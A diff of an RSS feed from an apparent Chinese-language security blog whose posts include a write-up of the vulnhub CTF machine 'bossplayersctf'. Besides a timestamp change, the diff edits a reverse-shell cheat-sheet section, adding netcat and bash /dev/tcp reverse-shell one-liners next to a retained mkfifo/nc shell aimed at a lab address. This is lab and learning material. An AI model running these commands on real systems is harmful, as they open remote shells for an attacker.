@@ -1,5 +1,5 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Thu, 13 Nov 2025 04:05:57 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster><item><title>bossplayersctf</title><link>https://dehua-rd.github.io/post/bossplayersctf.html</link><description># 靶机信息
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Thu, 13 Nov 2025 04:12:06 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster><item><title>bossplayersctf</title><link>https://dehua-rd.github.io/post/bossplayersctf.html</link><description># 靶机信息
 bossplayersctf是vulnhub中的一台简单难度的CTF类型的靶机
 
 # 信息收集
@@ -1685,7 +1685,10 @@ username字段有mysql报错，但是用sqlmap没有爆出东西。</description
 
 
 ## 反向shell
-`bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1`
+Netcat
+`nc $IP $PORT -e /bin/bash`
+bash
+`/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1'`
 不支持/dev/tcp
 `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.218.148 4444 &gt; /tmp/f`
 
